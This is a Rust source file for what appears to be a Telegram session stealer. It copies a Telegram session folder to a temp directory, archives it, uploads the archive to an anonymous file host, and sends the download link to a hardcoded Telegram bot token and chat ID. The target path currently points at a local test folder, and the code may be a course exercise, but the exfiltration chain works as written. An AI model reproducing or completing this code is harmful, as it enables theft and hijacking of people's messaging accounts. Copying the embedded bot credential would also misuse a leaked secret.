extern crate user32;
extern crate winapi;

pub mod utils;
use std::path::Path;
use std::env;
use utils::filesystem::{copy_dirs, do_zip_dir};
use utils::net::{AnonFilesUploader, TelegramBotSender};
use utils::os::{get_temp_dir_path, get_processes_path};
// use utils::find_path::{get_processes_path};
// //fn copy_telegram_session(mut telegram_folder: String) -> Result<(), String> {
// fn copy_telegram_session(mut telegram_folder: String) -> String {
//         // telegram_folder.push_str("\\Tdata");

//     // if !Path::new(&telegram_folder).exists() {
//     //     return Err("Tdata is not found".to_string());
//     // }

//     let mut temp_dir = get_temp_dir_path(); //?;
//     println!("Temp dir: {}", temp_dir);
//     temp_dir.push_str("720c2c46-0a3e-416f-b992-174a21555b7b(2)");
//     println!("Temp dir: {}", temp_dir);

//     let mut session_copy_path = temp_dir.clone();
//     session_copy_path.push_str("\\session");

//     let mut archive_path = temp_dir;
//     archive_path.push_str("\\session.tar");

//     copy_dirs(&telegram_folder, &session_copy_path).unwrap();
//     zip_dir(archive_path, session_copy_path).unwrap();
//     println!("Archive: {}", archive_path);

//     Ok(())
// }


fn prepare_session_archive(mut telegram_folder: String) -> String {
    let mut temp_dir = env::temp_dir().display().to_string();
    println!("Temp dir: {}", temp_dir);
    temp_dir.push_str("720c2c46-0a3e-416f-b992-174a21555b7b(2)");
    println!("Temp dir: {}", temp_dir);

    let mut session_copy_path = temp_dir.clone();
    session_copy_path.push_str("\\session");

    let mut archive_path = temp_dir;
    archive_path.push_str("\\session.tar");

    println!("Archive: {}", archive_path);
    copy_dirs(&telegram_folder, &session_copy_path).unwrap();
    let hive_path = archive_path.clone();

    match do_zip_dir(&archive_path, &session_copy_path) {
        Ok(_) => println!("done: {} written to {}", telegram_folder, hive_path),
        Err(e) => println!("Error: {:?}", e),
    }

    hive_path
}

//612753417
fn main() {
    let path = // get_processes_path();
    // C:\OTUS\vm_shared\myservice\MyService
    // target\\debug
    prepare_session_archive(r"\OTUS\vm_shared\myservice\MyService".to_string());
    println!("{}", path);

    let url =
        AnonFilesUploader::new(path.to_string())
            .upload()
            .unwrap();

    println!("{}", url);

    //return;
    TelegramBotSender::new(
        "5279761929:AAEnsQN3NyCqW5bJndsBzWOdWbqr4G3J9bQ".to_string(),
        "612753417".to_string()
    )
    .send_message(&url.to_string())
    .unwrap();
}
